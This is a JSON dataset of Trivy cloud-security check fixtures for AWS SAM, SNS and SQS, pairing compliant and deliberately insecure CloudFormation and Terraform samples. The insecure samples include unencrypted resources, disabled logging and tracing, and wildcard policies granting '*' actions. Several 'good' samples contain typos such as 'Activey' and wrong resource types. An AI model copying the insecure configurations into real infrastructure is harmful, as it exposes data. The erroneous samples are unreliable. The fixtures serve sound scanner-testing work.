        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            AccessLogSetting:\n              DestinationArn: gateway-logging\n              Format: json\n            Name: Good SAM API example\n            StageName: Prod\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_access_logging.yaml",
        "local_path": "aws/sam/enable_api_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      AccessLogSetting:\n        DestinationArn: gateway-logging\n        Format: json\n      Name: Good SAM API example\n      StageName: Prod"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_CACHE_ENCRYPTION",
        "title": "Enable Api Cache Encryption",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            MethodSettings:\n              CacheDataEncrypted: true\n            Name: Good SAM API example\n            StageName: Prod\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            MethodSettings:\n              CacheDataEncrypted: false\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_cache_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_cache_encryption.yaml",
        "local_path": "aws/sam/enable_api_cache_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      MethodSettings:\n        CacheDataEncrypted: true\n      Name: Good SAM API example\n      StageName: Prod"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod",
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      MethodSettings:\n        CacheDataEncrypted: false\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_API_TRACING",
        "title": "Enable Api Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Good SAM API example\n            StageName: Prod\n            TracingEnabled: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n            TracingEnabled: false\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::Api\n          Properties:\n            Name: Bad SAM API example\n            StageName: Prod\n",
        "file_name": "enable_api_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_api_tracing.yaml",
        "local_path": "aws/sam/enable_api_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Good SAM API example\n      StageName: Prod\n      TracingEnabled: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod\n      TracingEnabled: false",
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::Api\n    Properties:\n      Name: Bad SAM API example\n      StageName: Prod"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_FUNCTION_TRACING",
        "title": "Enable Function Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            PackageType: Image\n            Tracing: Active\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            PackageType: Image\n",
        "file_name": "enable_function_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_function_tracing.yaml",
        "local_path": "aws/sam/enable_function_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      PackageType: Image\n      Tracing: Active"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      PackageType: Image"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_HTTP_API_ACCESS_LOGGING",
        "title": "Enable Http Api Access Logging",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Serverless::HttpApi\n          Properties:\n            AccessLogSettings:\n              DestinationArn: gateway-logging\n              Format: json\n            Name: Good SAM API example\n            StageName: Prod\n            Tracing: Activey\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::HttpApi\n          Properties:\n            Name: Good SAM API example\n            StageName: Prod\n            Tracing: Passthrough\n",
        "file_name": "enable_http_api_access_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_http_api_access_logging.yaml",
        "local_path": "aws/sam/enable_http_api_access_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      AccessLogSettings:\n        DestinationArn: gateway-logging\n        Format: json\n      Name: Good SAM API example\n      StageName: Prod\n      Tracing: Activey"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      Name: Good SAM API example\n      StageName: Prod\n      Tracing: Passthrough"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_STATE_MACHINE_LOGGING",
        "title": "Enable State Machine Logging",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AWS::Serverless::StateMachine\n          Properties:\n            Logging:\n              Level: ALL\n              Destinations:\n                - CloudWatchLogsLogGroup:\n                    LogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/states/my-logs:*\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Serverless::StateMachine\n",
        "file_name": "enable_state_machine_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_state_machine_logging.yaml",
        "local_path": "aws/sam/enable_state_machine_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AWS::Serverless::StateMachine\n    Properties:\n      Logging:\n        Level: ALL\n        Destinations:\n          - CloudWatchLogsLogGroup:\n              LogGroupArn: arn:aws:logs:us-east-1:123456789012:log-group:/aws/states/my-logs:*"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Serverless::StateMachine"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_STATE_MACHINE_TRACING",
        "title": "Enable State Machine Tracing",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n  bad:\n    - |-\n      Resources:\n        BadStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: false\n    - |-\n      Resources:\n        BadStateMachine:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  End: true\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  Type: Task\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n",
        "file_name": "enable_state_machine_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_state_machine_tracing.yaml",
        "local_path": "aws/sam/enable_state_machine_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true"
            ],
            "bad": [
              "Resources:\n  BadStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: false",
              "Resources:\n  BadStateMachine:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            End: true\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            Type: Task\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-ENABLE_TABLE_ENCRYPTION",
        "title": "Enable Table Encryption",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            SSESpecification:\n              SSEEnabled: true\n            TableName: GoodTable\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            SSESpecification:\n              SSEEnabled: false\n            TableName: Bad Table\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::SimpleTable\n          Properties:\n            TableName: Bad Table\n",
        "file_name": "enable_table_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/enable_table_encryption.yaml",
        "local_path": "aws/sam/enable_table_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      SSESpecification:\n        SSEEnabled: true\n      TableName: GoodTable"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      SSESpecification:\n        SSEEnabled: false\n      TableName: Bad Table",
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::SimpleTable\n    Properties:\n      TableName: Bad Table"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-NO_FUNCTION_POLICY_WILDCARDS",
        "title": "No Function Policy Wildcards",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            PackageType: Image\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:GetObject\n                      - s3:GetObjectACL\n                    Resource: arn:aws:s3:::my-bucket/*\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::Function\n          Properties:\n            PackageType: Image\n            ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n            ImageConfig:\n              Command:\n                - app.lambda_handler\n              EntryPoint:\n                - entrypoint1\n              WorkingDirectory: workDir\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:*\n                    Resource: arn:aws:s3:::my-bucket/*\n",
        "file_name": "no_function_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/no_function_policy_wildcards.yaml",
        "local_path": "aws/sam/no_function_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      PackageType: Image\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:GetObject\n                - s3:GetObjectACL\n              Resource: arn:aws:s3:::my-bucket/*"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      PackageType: Image\n      ImageUri: account-id.dkr.ecr.region.amazonaws.com/ecr-repo-name:image-name\n      ImageConfig:\n        Command:\n          - app.lambda_handler\n        EntryPoint:\n          - entrypoint1\n        WorkingDirectory: workDir\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:*\n              Resource: arn:aws:s3:::my-bucket/*"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SAM-NO_STATE_MACHINE_POLICY_WILDCARDS",
        "title": "No State Machine Policy Wildcards",
        "provider": "aws",
        "service": "sam",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodFunction:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  Type: Task\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  End: true\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:GetObject\n                      - s3:GetObjectACL\n                    Resource: arn:aws:s3:::my-bucket/*\n  bad:\n    - |-\n      Resources:\n        BadFunction:\n          Type: AWS::Serverless::StateMachine\n          Properties:\n            Definition:\n              StartAt: MyLambdaState\n              States:\n                MyLambdaState:\n                  Type: Task\n                  Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n                  End: true\n            Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n            Tracing:\n              Enabled: true\n            Policies:\n              - AWSLambdaExecute\n              - Version: \"2012-10-17\"\n                Statement:\n                  - Effect: Allow\n                    Action:\n                      - s3:*\n                    Resource: arn:aws:s3:::my-bucket/*\n",
        "file_name": "no_state_machine_policy_wildcards.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sam/no_state_machine_policy_wildcards.yaml",
        "local_path": "aws/sam/no_state_machine_policy_wildcards.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodFunction:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            Type: Task\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            End: true\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:GetObject\n                - s3:GetObjectACL\n              Resource: arn:aws:s3:::my-bucket/*"
            ],
            "bad": [
              "Resources:\n  BadFunction:\n    Type: AWS::Serverless::StateMachine\n    Properties:\n      Definition:\n        StartAt: MyLambdaState\n        States:\n          MyLambdaState:\n            Type: Task\n            Resource: arn:aws:lambda:us-east-1:123456123456:function:my-sample-lambda-app\n            End: true\n      Role: arn:aws:iam::123456123456:role/service-role/my-sample-role\n      Tracing:\n        Enabled: true\n      Policies:\n        - AWSLambdaExecute\n        - Version: \"2012-10-17\"\n          Statement:\n            - Effect: Allow\n              Action:\n                - s3:*\n              Resource: arn:aws:s3:::my-bucket/*"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SNS-ENABLE_TOPIC_ENCRYPTION",
        "title": "Enable Topic Encryption",
        "provider": "aws",
        "service": "sns",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            KmsMasterKeyId: some-key\n            TopicName: blah\n  bad:\n    - |-\n      Resources:\n        BadTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            TopicName: blah\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"alias/aws/sns\"\n      }\n  bad:\n    - |-\n      resource \"aws_sns_topic\" \"bad_example\" {}\n",
        "file_name": "enable_topic_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sns/enable_topic_encryption.yaml",
        "local_path": "aws/sns/enable_topic_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      KmsMasterKeyId: some-key\n      TopicName: blah"
            ],
            "bad": [
              "Resources:\n  BadTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      TopicName: blah"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}",
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"alias/aws/sns\"\n}"
            ],
            "bad": [
              "resource \"aws_sns_topic\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SNS-TOPIC_ENCRYPTION_WITH_CMK",
        "title": "Topic Encryption With Cmk",
        "provider": "aws",
        "service": "sns",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodTopic:\n          Type: AWS::SQS::Topic\n          Properties:\n            KmsMasterKeyId: some-key\n            TopicName: blah\n  bad:\n    - |-\n      Resources:\n        BadTopic:\n          Type: AWS::SNS::Topic\n          Properties:\n            KmsMasterKeyId: alias/aws/sns\n            TopicName: blah\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sns_topic\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n  bad:\n    - |-\n      resource \"aws_sns_topic\" \"bad_example\" {\n        kms_master_key_id = \"alias/aws/sns\"\n      }\n",
        "file_name": "topic_encryption_with_cmk.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sns/topic_encryption_with_cmk.yaml",
        "local_path": "aws/sns/topic_encryption_with_cmk.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodTopic:\n    Type: AWS::SQS::Topic\n    Properties:\n      KmsMasterKeyId: some-key\n      TopicName: blah"
            ],
            "bad": [
              "Resources:\n  BadTopic:\n    Type: AWS::SNS::Topic\n    Properties:\n      KmsMasterKeyId: alias/aws/sns\n      TopicName: blah"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sns_topic#example-with-server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sns_topic\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}"
            ],
            "bad": [
              "resource \"aws_sns_topic\" \"bad_example\" {\n  kms_master_key_id = \"alias/aws/sns\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-ENABLE_QUEUE_ENCRYPTION",
        "title": "Enable Queue Encryption",
        "provider": "aws",
        "service": "sqs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            KmsMasterKeyId: some-key\n            QueueName: my-queue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue\n\n      Resources:\n        Queue:\n          Type: AWS::SQS::Queue\n          Properties:\n            QueueName: my-queue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse\n  good:\n    - |-\n      resource \"aws_sqs_queue\" \"good_example\" {\n        kms_master_key_id = \"/blah\"\n      }\n    - |-\n      resource \"aws_sqs_queue\" \"terraform_queue\" {\n        name                    = \"terraform-example-queue\"\n        sqs_managed_sse_enabled = true\n      }\n    - |-\n      resource \"aws_sqs_queue\" \"terraform_queue\" {\n        name              = \"terraform-example-queue\"\n        kms_master_key_id = \"alias/aws/sqs\"\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue\" \"bad_example\" {\n        # no key specified\n      }\n",
        "file_name": "enable_queue_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/enable_queue_encryption.yaml",
        "local_path": "aws/sqs/enable_queue_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      KmsMasterKeyId: some-key\n      QueueName: my-queue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue\n\nResources:\n  Queue:\n    Type: AWS::SQS::Queue\n    Properties:\n      QueueName: my-queue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue#server-side-encryption-sse"
            ],
            "good": [
              "resource \"aws_sqs_queue\" \"good_example\" {\n  kms_master_key_id = \"/blah\"\n}",
              "resource \"aws_sqs_queue\" \"terraform_queue\" {\n  name                    = \"terraform-example-queue\"\n  sqs_managed_sse_enabled = true\n}",
              "resource \"aws_sqs_queue\" \"terraform_queue\" {\n  name              = \"terraform-example-queue\"\n  kms_master_key_id = \"alias/aws/sqs\"\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue\" \"bad_example\" {\n  # no key specified\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-NO_WILDCARDS_IN_POLICY_DOCUMENTS",
        "title": "No Wildcards In Policy Documents",
        "provider": "aws",
        "service": "sqs",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of queue policy\n\n      Resources:\n        MyQueue:\n          Type: AWS::SQS::Queue\n          Properties:\n            Name: something\n\n        SampleSQSPolicy:\n          Type: AWS::SQS::QueuePolicy\n          Properties:\n            PolicyDocument:\n              Statement:\n                - Action:\n                    - SQS:SendMessage\n                    - SQS:ReceiveMessage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - \"111122223333\"\n                  Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n            Queues:\n              - !Ref MyQueue\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of queue policy\n\n      Resources:\n        MyQueue:\n          Type: AWS::SQS::Queue\n          Properties:\n            Name: something\n\n        SampleSQSPolicy:\n          Type: AWS::SQS::QueuePolicy\n          Properties:\n            PolicyDocument:\n              Statement:\n                - Action:\n                    - '*'\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - \"111122223333\"\n                  Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n            Queues:\n              - !Ref MyQueue\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy\n  good:\n    - |-\n      resource \"aws_sqs_queue_policy\" \"good_example\" {\n        queue_url = aws_sqs_queue.q.id\n\n        policy = <<POLICY\n       {\n         \"Statement\": [\n           {\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": \"sqs:SendMessage\"\n           }\n         ]\n       }\n       POLICY\n      }\n  bad:\n    - |-\n      resource \"aws_sqs_queue_policy\" \"bad_example\" {\n        queue_url = aws_sqs_queue.q.id\n\n        policy = <<POLICY\n       {\n         \"Statement\": [\n           {\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": \"*\"\n           }\n         ]\n       }\n       POLICY\n      }\n",
        "file_name": "no_wildcards_in_policy_documents.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/sqs/no_wildcards_in_policy_documents.yaml",
        "local_path": "aws/sqs/no_wildcards_in_policy_documents.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of queue policy\n\nResources:\n  MyQueue:\n    Type: AWS::SQS::Queue\n    Properties:\n      Name: something\n\n  SampleSQSPolicy:\n    Type: AWS::SQS::QueuePolicy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Action:\n              - SQS:SendMessage\n              - SQS:ReceiveMessage\n            Effect: Allow\n            Principal:\n              AWS:\n                - \"111122223333\"\n            Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n      Queues:\n        - !Ref MyQueue"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of queue policy\n\nResources:\n  MyQueue:\n    Type: AWS::SQS::Queue\n    Properties:\n      Name: something\n\n  SampleSQSPolicy:\n    Type: AWS::SQS::QueuePolicy\n    Properties:\n      PolicyDocument:\n        Statement:\n          - Action:\n              - '*'\n            Effect: Allow\n            Principal:\n              AWS:\n                - \"111122223333\"\n            Resource: arn:aws:sqs:us-east-2:444455556666:queue2\n      Queues:\n        - !Ref MyQueue"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/sqs_queue_policy"
            ],
            "good": [
              "resource \"aws_sqs_queue_policy\" \"good_example\" {\n  queue_url = aws_sqs_queue.q.id\n\n  policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"sqs:SendMessage\"\n     }\n   ]\n }\n POLICY\n}"
            ],
            "bad": [
              "resource \"aws_sqs_queue_policy\" \"bad_example\" {\n  queue_url = aws_sqs_queue.q.id\n\n  policy = <<POLICY\n {\n   \"Statement\": [\n     {\n       \"Effect\": \"Allow\",\n       \"Principal\": \"*\",\n       \"Action\": \"*\"\n     }\n   ]\n }\n POLICY\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-SQS-QUEUE_ENCRYPTION_WITH_CMK",
        "title": "Queue Encryption With Cmk",
        "provider": "aws",
        "service": "sqs",
        "language": "terraform",
